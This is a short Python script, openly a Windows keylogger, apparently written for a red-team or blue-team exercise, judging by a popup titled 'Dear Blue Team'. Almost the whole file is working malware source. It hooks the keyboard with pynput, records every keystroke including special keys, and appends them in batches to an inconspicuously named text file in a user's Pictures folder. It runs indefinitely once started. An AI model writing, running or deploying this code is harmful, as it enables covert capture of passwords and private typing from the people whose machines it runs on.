import pynput
import os
import ctypes
import winsound
import time

keystroke_count = 0

# Path to save the log file
log_file_path = r"C:\\Users\\alice\\Pictures\\random.txt"

# Initialize a list to store keystrokes
keystrokes = []

# Function to write keystrokes to a file
def write_to_file():
    with open(log_file_path, "a") as log_file:
        log_file.write(''.join(keystrokes))
    keystrokes.clear()  # Clear the list after writing to avoid duplication

# Define the function that will be called on key press
def on_press(key):
    global keystroke_count
    try:
        # Store character keys
        keystrokes.append(key.char)
    except AttributeError:
        # Store special keys like Space, Enter, etc.
        if key == pynput.keyboard.Key.space:
            keystrokes.append(' ')
        elif key == pynput.keyboard.Key.enter:
            keystrokes.append('\n')
        elif key == pynput.keyboard.Key.backspace:
            keystrokes.append('[BACKSPACE]')
        else:
            keystrokes.append(f'[{str(key)}]')

    keystroke_count += 1
    # Write to file continuously
    if len(keystrokes) >= 10:  # Adjust the number to control when to write to file
        write_to_file()

# Function to show a popup message (if needed, but commented out for non-interactive run)
def show_popup(message):
    ctypes.windll.user32.MessageBoxW(0, message, "🎃Dear Blue Team🎃", 1)

# Main function to run the keylogger
def start_keylogger():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        # Run indefinitely
        listener.join()

# Run the keylogger
if __name__ == "__main__":
    start_keylogger()
